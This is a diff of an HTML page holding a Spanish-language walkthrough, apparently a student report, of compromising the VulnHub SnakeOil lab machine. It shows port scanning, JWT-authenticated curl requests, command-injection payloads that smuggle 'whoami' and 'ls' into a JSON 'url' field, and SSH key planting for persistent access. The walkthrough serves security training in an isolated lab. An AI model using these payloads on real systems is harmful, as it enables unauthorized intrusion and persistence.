@@ -330,14 +330,14 @@
     </a>
     <h3>Introducción</h3>
     <p>
-      En el vasto mundo de la ciberseguridad, la línea entre el conocimiento teórico y la aplicación práctica es a menudo el mayor desafío para un profesional en formación. Este proyecto, titulado "De la teoría a la práctica: walkthrough en acción", representa un viaje completo a través de las fases de un ataque informático ético, desde el reconocimiento inicial hasta la obtención de control total sobre un sistema objetivo. 
-      La máquina virtual elegida para este ejercicio fue SnakeOil, un entorno intencionalmente vulnerable diseñado para ser desplegado en la plataforma VulnHub. Su objetivo no es otro que poner a prueba las habilidades de un aspirante a hacker ético, obligándolo a pensar como un atacante real. Este informe documenta, paso a paso, el proceso de vulneración de SnakeOil, explicando cada técnica, herramienta y decisión tomada, así como los fundamentos teóricos que las sustentan. 
-      A lo largo de este recorrido, se pondrán en práctica conceptos clave como el escaneo de puertos, la enumeración de servicios web, la explotación de vulnerabilidades (SSRF, RCE), el uso de JSON Web Tokens (JWT), la subida de claves SSH y la escalada de privilegios. Cada uno de estos pasos no es un simple acto mecánico, sino una decisión estratégica basada en el análisis de la información recolectada. 
-      El presente informe no solo demuestra la capacidad técnica para vulnerar un sistema, sino también la habilidad para documentar, explicar y contextualizar cada acción, transformando un simple "hackeo" en un proceso de aprendizaje estructurado y replicable. Bienvenidos a este viaje desde la teoría hasta la práctica en el fascinante mundo de la ciberseguridad ofensiva.
+      En el vasto mundo de la ciberseguridad, la línea entre el conocimiento teórico y la aplicación práctica es a menudo el mayor desafío para un profesional en formación. Este proyecto, titulado "De la teoría a la práctica: walkthrough en acción", representa un viaje completo a través de las fases de un ataque informático ético, desde el reconocimiento inicial hasta la obtención de control total sobre un sistema objetivo. <br>
+      La máquina virtual elegida para este ejercicio fue SnakeOil, un entorno intencionalmente vulnerable diseñado para ser desplegado en la plataforma VulnHub. Su objetivo no es otro que poner a prueba las habilidades de un aspirante a hacker ético, obligándolo a pensar como un atacante real. Este informe documenta, paso a paso, el proceso de vulneración de SnakeOil, explicando cada técnica, herramienta y decisión tomada, así como los fundamentos teóricos que las sustentan. <br>
+      A lo largo de este recorrido, se pondrán en práctica conceptos clave como el escaneo de puertos, la enumeración de servicios web, la explotación de vulnerabilidades (SSRF, RCE), el uso de JSON Web Tokens (JWT), la subida de claves SSH y la escalada de privilegios. Cada uno de estos pasos no es un simple acto mecánico, sino una decisión estratégica basada en el análisis de la información recolectada. <br>
+      El presente informe no solo demuestra la capacidad técnica para vulnerar un sistema, sino también la habilidad para documentar, explicar y contextualizar cada acción, transformando un simple "hackeo" en un proceso de aprendizaje estructurado y replicable. Bienvenidos a este viaje desde la teoría hasta la práctica en el fascinante mundo de la ciberseguridad ofensiva. <br>
     </p>
     <h3>Preparar laboratorio para la practica</h3>
     <p>
-      Configuración de VirtualBox: Se importó la máquina virtual descargada utilizando la opción "Importar servicio virtualizado" de VirtualBox. Se configuró la máquina atacante (Kali Linux) y la máquina objetivo (SnakeOil) para que estuvieran en la misma red interna y aislada.
+      Configuración de VirtualBox: Se importó la máquina virtual descargada utilizando la opción "Importar servicio virtualizado" de VirtualBox. Se configuró la máquina atacante (Kali Linux) y la máquina objetivo (SnakeOil) para que estuvieran en la misma red interna y aislada. <br>
     </p>
     <h4>Instalar las máquinas virtuales (Kali y SanakeOil) </h4>
     <br>
@@ -365,7 +365,7 @@
     <br>
     <h3>Escaneo de puertos </h3>
     <p>
-      Se realizó un escaneo de puertos específico para identificar servicios potencialmente vulnerables. Una vez conociendo la ip hacemos un escaneo de puertos a la víctima, con el comando nmap –sS –p 22,80,443,8080,8443 192.168.56.103, el parámetro –sS nos ayudara a hacer un escaneo rápido y sigiloso, mientras que el parámetro –p nos permite enlistar puertos específicos a escanear en lugar de escanear los 65 mil puertos.
+      Se realizó un escaneo de puertos específico para identificar servicios potencialmente vulnerables. Una vez conociendo la ip hacemos un escaneo de puertos a la víctima, con el comando nmap –sS –p 22,80,443,8080,8443 192.168.56.103, el parámetro –sS nos ayudara a hacer un escaneo rápido y sigiloso, mientras que el parámetro –p nos permite enlistar puertos específicos a escanear en lugar de escanear los 65 mil puertos. <br>
     </p>
     <h3>Enumeración de directorios con gobuster  </h3>
     <figure class="bloque-imagen-centrada">
@@ -376,20 +376,21 @@
     <h3>Obtención de información de usuarios/Registro de usuarios/Inicio de sesión/ Acceso a secret/Ejecución remota de comandos RCE </h3>
     <figure class="bloque-imagen-centrada">
         <img src="images/PR1/img6.png" alt="Descripción breve para accesibilidad">
-        <figcaption>Usamos el comando curl http://192.168.56.103:8080/users, curl Client-URL nos permite transferir datos desde o hacia un servidor, /users una de las rutas que descubrimos con gobuster nos ayudara, nos da información valga la redundancia de usuarios. 
+        <figcaption>Usamos el comando curl http://192.168.56.103:8080/users, curl Client-URL nos permite transferir datos desde o hacia un servidor, /users una de las rutas que descubrimos con gobuster nos ayudara, nos da información valga la redundancia de usuarios. <br>
           Para los comandos: 
-          curl -X POST http://192.168.56.103:8080/registration -H "Content-Type: application/json" -d '{"username":"hacker","password":"hacker1234"}' 
-          curl -X POST http://192.168.56.103:8080/login -H "Content-Type: application/json" -d '{"username":"hacker","password":"hacker1234"}' 
-          -X POST nos ayuda a enviar información en estos casos registro y logeo, -H “Content... le dice al servidor el tipo de datos que estamos mandando y –d de data (Datos). Este último comando /login nos arroja un token que nos autentica ante el servidor como legitimo. ¿Dónde nos estamos logeando? En la aplicación web que corre en el puerto 8080. Posteriormente usamos curl -X GET http://192.168.56.103:8080/secret -H "Cookie: access_token_cookie=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...." Para obtener el la “secret_key” que nos ayudara a ejecutar comandos en /run. Para este comando necesitamos autenticación que la obtuvimos con el token que obtuvimos con /login 
-          Usando el comando curl -X POST http://192.168.56.103:8080/run -H "Content-Type: application/json" -d '{"secretkey":"commandexecutionissecret","url":"-h | whoami;"}' a quien le enviamos el tipo de datos que estamos mandando “json” y la secretkey asi como el comando a ejecutar -h | whoami nos arroja al usuario correcto en este caso “Patrick” 
-          Este comando curl -X POST http://192.168.56.103:8080/run -H "Content-Type: application/json" -d '{"secret_key":"commandexecutionissecret","url":"-V&ls -la /home/patrick/"}' nos enlista los directorios y podemos confirmar que existe el directorio .ssh 
+          curl -X POST http://192.168.56.103:8080/registration -H "Content-Type: application/json" -d '{"username":"hacker","password":"hacker1234"}' <br>
+          curl -X POST http://192.168.56.103:8080/login -H "Content-Type: application/json" -d '{"username":"hacker","password":"hacker1234"}' <br>
+          -X POST nos ayuda a enviar información en estos casos registro y logeo, -H “Content... le dice al servidor el tipo de datos que estamos mandando y –d de data (Datos). Este último comando /login nos arroja un token que nos autentica ante el servidor como legitimo. ¿Dónde nos estamos logeando? En la aplicación web que corre en el puerto 8080. <br> Posteriormente usamos curl -X GET http://192.168.56.103:8080/secret -H "Cookie: access_token_cookie=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...." <br> Para obtener el la “secret_key” que nos ayudara a ejecutar comandos en /run. Para este comando necesitamos autenticación que la obtuvimos con el token que obtuvimos con /login <br>
+          Usando el comando curl -X POST http://192.168.56.103:8080/run -H "Content-Type: application/json" -d '{"secretkey":"commandexecutionissecret","url":"-h | whoami;"}' a quien le enviamos el tipo de datos que estamos mandando “json” y la secretkey asi como el comando a ejecutar -h | whoami nos arroja al usuario correcto en este caso “Patrick” <br>
+          Este comando curl -X POST http://192.168.56.103:8080/run -H "Content-Type: application/json" -d '{"secret_key":"commandexecutionissecret","url":"-V&ls -la /home/patrick/"}' nos enlista los directorios y podemos confirmar que existe el directorio .ssh <br>
         </figcaption>
     </figure>
     <br>
-    <h3>Subida de clave para ssh</h3>
+    <h3>Subida de clave para ssh</h3> <br>
     <p>
       Como ultimo comando de esta captura de pantalla ssh-keygen -t rsa -b 4096 -f /root/.ssh/id_rsa_snakemail -N "", una vez sabiendo que el puerto ssh esta, creamos una clave de acceso de ssh desde nuestra maquina atacante KaliLinux, -t rsa para indicarle el tipo de clave en este caso rsa, -b 4096 le indicamos el tamaño de la clave en bits, -f /root/.ssh... le decimos la ruta donde guardara la clave privada/pública y por ultimo –N"” nos ayuda a ingresar sin contraseña.
     </p>
+    <br>
     <figure class="bloque-imagen-centrada">
         <img src="images/PR1/img7.png" alt="Descripción breve para accesibilidad">
         <figcaption>Con el siguiente comando cat /root/.ssh/id_rsa_snakemail.pub > /var/www/html/authorized_keys movemos de directorio nuestra clave publica a otro directorio dentro de nuestro Kali para después iniciar el servidor web http </figcaption>
@@ -433,11 +434,11 @@
     <h3>Conclusión</h3>
     <p>
       Este walkthrough demuestra cómo una máquina aparentemente segura puede ser comprometida mediante la combinación de técnicas de enumeración, explotación de vulnerabilidades y escalada de privilegios. Se logró: 
-      Configurar un entorno aislado para pruebas seguras. 
-      Identificar servicios vulnerables (puertos 8080 y 22). 
-      Explotar un SSRF para obtener RCE. 
-      Subir una clave SSH para acceso persistente. 
-      Escalar a root mediante la contraseña encontrada en el código fuente. 
+      Configurar un entorno aislado para pruebas seguras. <br>
+      Identificar servicios vulnerables (puertos 8080 y 22). <br>
+      Explotar un SSRF para obtener RCE. <br>
+      Subir una clave SSH para acceso persistente. <br> 
+      Escalar a root mediante la contraseña encontrada en el código fuente. <br>
       Este proceso refleja la importancia de aplicar los conocimientos teóricos en entornos prácticos, documentando cada paso y entendiendo el fundamento de cada técnica utilizada.
     </p>
     <br>
